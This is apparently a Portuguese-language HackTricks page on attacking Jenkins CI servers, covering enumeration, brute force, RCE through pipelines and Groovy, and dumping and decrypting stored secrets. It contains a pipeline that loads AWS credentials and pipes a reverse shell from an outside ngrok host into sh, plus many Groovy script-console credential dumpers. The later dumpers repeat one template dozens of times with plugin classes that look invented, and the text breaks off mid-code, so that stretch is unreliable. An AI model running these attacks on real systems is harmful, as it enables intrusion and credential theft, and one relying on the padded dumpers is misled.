# Jenkins Security

{% hint style="success" %}
Aprenda e pratique AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

Jenkins √© uma ferramenta que oferece um m√©todo simples para estabelecer um ambiente de **integra√ß√£o cont√≠nua** ou **entrega cont√≠nua** (CI/CD) para quase **qualquer** combina√ß√£o de **linguagens de programa√ß√£o** e reposit√≥rios de c√≥digo-fonte usando pipelines. Al√©m disso, automatiza v√°rias tarefas rotineiras de desenvolvimento. Embora o Jenkins n√£o elimine a **necessidade de criar scripts para etapas individuais**, ele fornece uma maneira mais r√°pida e robusta de integrar toda a sequ√™ncia de ferramentas de constru√ß√£o, teste e implanta√ß√£o do que se pode construir manualmente.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumera√ß√£o N√£o Autenticada

Para procurar por p√°ginas interessantes do Jenkins sem autentica√ß√£o, como (_/people_ ou _/asynchPeople_, que listam os usu√°rios atuais), voc√™ pode usar:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Verifique se voc√™ pode executar comandos sem precisar de autentica√ß√£o:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sem credenciais, voc√™ pode olhar dentro do caminho _**/asynchPeople/**_ ou _**/securityRealm/user/admin/search/index?q=**_ para **nomes de usu√°rio**.

Voc√™ pode conseguir obter a vers√£o do Jenkins a partir do caminho _**/oops**_ ou _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Vulnerabilidades Conhecidas

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Login

Na informa√ß√£o b√°sica, voc√™ pode verificar **todas as maneiras de fazer login no Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registrar

Voc√™ poder√° encontrar inst√¢ncias do Jenkins que **permitem criar uma conta e fazer login. Simples assim.**

### **SSO Login**

Al√©m disso, se a **funcionalidade**/**plugins** de **SSO** estiverem presentes, voc√™ deve tentar **fazer login** na aplica√ß√£o usando uma conta de teste (por exemplo, uma conta de teste do **Github/Bitbucket**). Truque de [**aqui**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** n√£o possui **pol√≠tica de senha** e **mitiga√ß√£o de brute-force de nome de usu√°rio**. √â essencial **brutefor√ßar** usu√°rios, pois **senhas fracas** ou **nomes de usu√°rio como senhas** podem estar em uso, at√© mesmo **nomes de usu√°rio invertidos como senhas**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Use [este script em python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ou [este script em powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Muitas organiza√ß√µes combinam **sistemas de gerenciamento de controle de origem (SCM) baseados em SaaS** como GitHub ou GitLab com uma **solu√ß√£o CI interna e auto-hospedada** como Jenkins ou TeamCity. Esta configura√ß√£o permite que os sistemas CI **recebam eventos de webhook dos fornecedores de controle de origem SaaS**, principalmente para acionar trabalhos de pipeline.

Para conseguir isso, as organiza√ß√µes **colocam na lista de permiss√µes** os **intervalos de IP** das **plataformas SCM**, permitindo que acessem o **sistema CI interno** via **webhooks**. No entanto, √© importante notar que **qualquer pessoa** pode criar uma **conta** no GitHub ou GitLab e configur√°-la para **acionar um webhook**, potencialmente enviando solicita√ß√µes para o **sistema CI interno**.

Verifique: [shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Abusos Internos do Jenkins

Nesses cen√°rios, vamos supor que voc√™ tenha uma conta v√°lida para acessar o Jenkins.

{% hint style="warning" %}
Dependendo do mecanismo de **Autoriza√ß√£o** configurado no Jenkins e da permiss√£o do usu√°rio comprometido, voc√™ **pode ou n√£o ser capaz de realizar os seguintes ataques.**
{% endhint %}

Para mais informa√ß√µes, verifique as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listando usu√°rios

Se voc√™ acessou o Jenkins, pode listar outros usu√°rios registrados em [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Despejando builds para encontrar segredos em texto claro

Use [este script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) para despejar sa√≠das de console de builds e vari√°veis de ambiente de builds para, com sorte, encontrar segredos em texto claro.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Roubando Credenciais SSH**

Se o usu√°rio comprometido tiver **privil√©gios suficientes para criar/modificar um novo n√≥ Jenkins** e as credenciais SSH j√° estiverem armazenadas para acessar outros n√≥s, ele pode **roubar essas credenciais** criando/modificando um n√≥ e **configurando um host que registrar√° as credenciais** sem verificar a chave do host:

![](<../../.gitbook/assets/image (218).png>)

Voc√™ geralmente encontrar√° credenciais ssh do Jenkins em um **provedor global** (`/credentials/`), ent√£o voc√™ tamb√©m pode despej√°-las como faria com qualquer outro segredo. Mais informa√ß√µes na [**Se√ß√£o de despejo de segredos**](./#dumping-secrets).

### **RCE no Jenkins**

Obter um **shell no servidor Jenkins** d√° ao atacante a oportunidade de vazar todos os **segredos** e **vari√°veis de ambiente** e **explorar outras m√°quinas** localizadas na mesma rede ou at√© mesmo **coletar credenciais de cloud**.

Por padr√£o, o Jenkins **executar√° como SYSTEM**. Portanto, compromet√™-lo dar√° ao atacante **privil√©gios de SYSTEM**.

### **RCE Criando/Modificando um projeto**

Criar/Modificar um projeto √© uma maneira de obter RCE no servidor Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Executando script Groovy**

Voc√™ tamb√©m pode obter RCE executando um script Groovy, que pode ser mais furtivo do que criar um novo projeto:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Criando/Modificando Pipeline

Voc√™ tamb√©m pode obter **RCE criando/modificando um pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Explora√ß√£o de Pipeline

Para explorar pipelines voc√™ ainda precisa ter acesso ao Jenkins.

### Build Pipelines

**Pipelines** tamb√©m podem ser usados como **mecanismo de build em projetos**, nesse caso pode ser configurado um **arquivo dentro do reposit√≥rio** que conter√° a sintaxe do pipeline. Por padr√£o, `/Jenkinsfile` √© usado:

![](<../../.gitbook/assets/image (127).png>)

Tamb√©m √© poss√≠vel **armazenar arquivos de configura√ß√£o de pipeline em outros lugares** (em outros reposit√≥rios, por exemplo) com o objetivo de **separar** o acesso ao reposit√≥rio e o acesso ao pipeline.

Se um atacante tiver **acesso de escrita sobre esse arquivo**, ele poder√° **modific√°-lo** e **potencialmente acionar** o pipeline sem nem mesmo ter acesso ao Jenkins.\
√â poss√≠vel que o atacante precise **contornar algumas prote√ß√µes de branch** (dependendo da plataforma e dos privil√©gios do usu√°rio, elas podem ou n√£o ser contornadas).

Os gatilhos mais comuns para executar um pipeline personalizado s√£o:

* **Pull request** para a branch principal (ou potencialmente para outras branches)
* **Push para a branch principal** (ou potencialmente para outras branches)
* **Atualizar a branch principal** e esperar at√© que seja executado de alguma forma

{% hint style="info" %}
Se voc√™ √© um **usu√°rio externo**, n√£o deve esperar criar um **PR para a branch principal** do reposit√≥rio de **outro usu√°rio/organiza√ß√£o** e **acionar o pipeline**... mas se estiver **mal configurado**, voc√™ poderia **comprometer totalmente empresas apenas explorando isso**.
{% endhint %}

### Pipeline RCE

Na se√ß√£o anterior de RCE j√° foi indicada uma t√©cnica para [**obter RCE modificando um pipeline**](./#rce-creating-modifying-pipeline).

### Verificando Vari√°veis de Ambiente

√â poss√≠vel declarar **vari√°veis de ambiente em texto claro** para todo o pipeline ou para est√°gios espec√≠ficos. Essas vari√°veis de ambiente **n√£o devem conter informa√ß√µes sens√≠veis**, mas um atacante sempre pode **verificar todas as configura√ß√µes do pipeline/Jenkinsfiles**:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Para obter informa√ß√µes sobre como os segredos geralmente s√£o tratados pelo Jenkins, confira as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

As credenciais podem ser **abrangidas por provedores globais** (`/credentials/`) ou por **projetos espec√≠ficos** (`/job/<project-name>/configure`). Portanto, para exfiltrar todas elas, voc√™ precisa **comprometer pelo menos todos os projetos** que cont√™m segredos e executar pipelines customizados/envenenados.

H√° outro problema: para obter um **segredo dentro do env** de um pipeline, voc√™ precisa **saber o nome e o tipo do segredo**. Por exemplo, se voc√™ tentar **carregar** um **segredo** do tipo **`usernamePassword`** como um **segredo** do tipo **`string`**, voc√™ receber√° este **erro**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Aqui est√° a maneira de carregar alguns tipos comuns de segredos:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
No final desta p√°gina voc√™ pode **encontrar todos os tipos de credenciais**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
A melhor maneira de **despejar todos os segredos de uma vez** √© **comprometendo** a m√°quina **Jenkins** (executando um reverse shell no **n√≥ embutido**, por exemplo) e ent√£o **vazando** as **chaves mestres** e os **segredos criptografados** e descriptografando-os offline.\
Mais sobre como fazer isso na [se√ß√£o Nodes & Agents](./#nodes-and-agents) e na [se√ß√£o Post Exploitation](./#post-exploitation).
{% endhint %}

### Triggers

Dos [documentos](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): A diretiva `triggers` define as **maneiras automatizadas pelas quais o Pipeline deve ser reativado**. Para Pipelines que s√£o integrados com uma fonte como GitHub ou BitBucket, `triggers` podem n√£o ser necess√°rios, pois a integra√ß√£o baseada em webhooks provavelmente j√° estar√° presente. Os triggers atualmente dispon√≠veis s√£o `cron`, `pollSCM` e `upstream`.

Exemplo de Cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Confira **outros exemplos na documenta√ß√£o**.

### Nodes & Agents

Uma **inst√¢ncia Jenkins** pode ter **diferentes agentes rodando em diferentes m√°quinas**. Do ponto de vista de um atacante, acesso a diferentes m√°quinas significa **diferentes potenciais credenciais de cloud** para roubar ou **diferente acesso √† rede** que poderia ser abusado para explorar outras m√°quinas.

Para mais informa√ß√µes, confira as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Voc√™ pode enumerar os **nodes configurados** em `/computer/`, voc√™ geralmente encontrar√° o **`Built-In Node`** (que √© o node rodando Jenkins) e potencialmente mais:

![](<../../.gitbook/assets/image (249).png>)

√â **especialmente interessante comprometer o Built-In node** porque ele cont√©m informa√ß√µes sens√≠veis do Jenkins.

Para indicar que voc√™ quer **rodar** o **pipeline** no **node built-in do Jenkins**, voc√™ pode especificar dentro do pipeline a seguinte configura√ß√£o:
```bash
pipeline {
agent {label 'built-in'}
```
### Exemplo completo

Pipeline em um agente espec√≠fico, com um gatilho cron, com vari√°veis de ambiente de pipeline e de est√°gio, carregando 2 vari√°veis em um passo e enviando um reverse shell:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## P√≥s-Explora√ß√£o

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

Voc√™ pode listar os segredos acessando `/credentials/` se tiver permiss√µes suficientes. Note que isso listar√° apenas os segredos dentro do arquivo `credentials.xml`, mas **arquivos de configura√ß√£o de build** tamb√©m podem ter **mais credenciais**.

Se voc√™ pode **ver a configura√ß√£o de cada projeto**, voc√™ tamb√©m pode ver l√° os **nomes das credenciais (segredos)** sendo usados para acessar o reposit√≥rio e **outras credenciais do projeto**.

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

Esses arquivos s√£o necess√°rios para **descriptografar segredos do Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

Tais **segredos geralmente podem ser encontrados em**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Aqui est√° uma regex para encontr√°-los:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Decrypt Jenkins secrets offline

Se voc√™ extraiu as **senhas necess√°rias para descriptografar os segredos**, use [**este script**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **para descriptografar esses segredos**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Decrypt Jenkins secrets from Groovy

```groovy
import jenkins.model.*
import hudson.util.Secret

def instance = Jenkins.getInstance()
def hudsonRealm = instance.getSecurityRealm()
def encryptedPassword = '{XXX=}'

def decryptedPassword = hudson.util.Secret.decrypt(encryptedPassword).getPlainText()
println(decryptedPassword)
```

#### Dump credentials from the script console

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    println(c.id + ' ' + c.description)
}
```

#### Dump credentials from the script console (hashes)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    println(c.id + ' ' + c.description + ' ' + c.secret)
}
```

#### Dump credentials from the script console (usernames and passwords)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof UsernamePasswordCredentials) {
        println(c.id + ' ' + c.username + ' ' + c.password)
    }
}
```

#### Dump credentials from the script console (AWS tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.jenkins.plugins.awscredentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof AmazonWebServicesCredentials) {
        println(c.id + ' ' + c.accessKey + ' ' + c.secretKey)
    }
}
```

#### Dump credentials from the script console (GCP tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.google.jenkins.plugins.credentials.oauth.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof GoogleRobotPrivateKeyCredentials) {
        println(c.id + ' ' + c.projectId + ' ' + c.privateKey)
    }
}
```

#### Dump credentials from the script console (Azure tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.microsoft.azure.util.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof AzureCredentials) {
        println(c.id + ' ' + c.clientId + ' ' + c.clientSecret)
    }
}
```

#### Dump credentials from the script console (SSH keys)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof BasicSSHUserPrivateKey) {
        println(c.id + ' ' + c.username + ' ' + c.privateKey)
    }
}
```

#### Dump credentials from the script console (certificates)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof CertificateCredentials) {
        println(c.id + ' ' + c.password + ' ' + c.keyStoreSource)
    }
}
```

#### Dump credentials from the script console (GitHub tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import org.jenkinsci.plugins.github_branch_source.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof GitHubAppCredentials) {
        println(c.id + ' ' + c.appID + ' ' + c.privateKey)
    }
}
```

#### Dump credentials from the script console (Bitbucket tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.jenkins.plugins.bitbucket.credentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof BitbucketTokenCredentials) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (GitLab tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.dabsquared.gitlabjenkins.connection.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof GitLabApiTokenImpl) {
        println(c.id + ' ' + c.apiToken)
    }
}
```

#### Dump credentials from the script console (Vault tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.datapipe.jenkins.vault.credentials.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof VaultTokenCredential) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Kubernetes tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import org.csanchez.jenkins.plugins.kubernetes.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof TokenProducer) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Docker tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.nirima.jenkins.plugins.docker.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof DockerRegistryToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Artifactory tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import org.jfrog.hudson.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof ArtifactoryToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Nexus tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import org.sonatype.nexus.ci.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof NexusToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Slack tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.slack.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof SlackToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Telegram tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.telegram.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof TelegramToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Discord tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.discord.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof DiscordToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Mattermost tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.mattermost.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof MattermostToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Rocket.Chat tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.rocketchat.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof RocketChatToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Matrix tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.matrix.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof MatrixToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (IRC tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.irc.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof IrcToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (XMPP tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.xmpp.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof XmppToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (HipChat tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.hipchat.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof HipChatToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Flowdock tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.flowdock.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof FlowdockToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Twilio tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.twilio.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof TwilioToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (PagerDuty tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.pagerduty.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof PagerDutyToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (OpsGenie tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.opsgenie.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof OpsGenieToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (VictorOps tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.victorops.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof VictorOpsToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (ServiceNow tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.servicenow.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

for (c in store.getCredentials(domain)) {
    if (c instanceof ServiceNowToken) {
        println(c.id + ' ' + c.token)
    }
}
```

#### Dump credentials from the script console (Zendesk tokens)

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import jenkins.plugins.zendesk.*

def domain = Domain.global()
def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

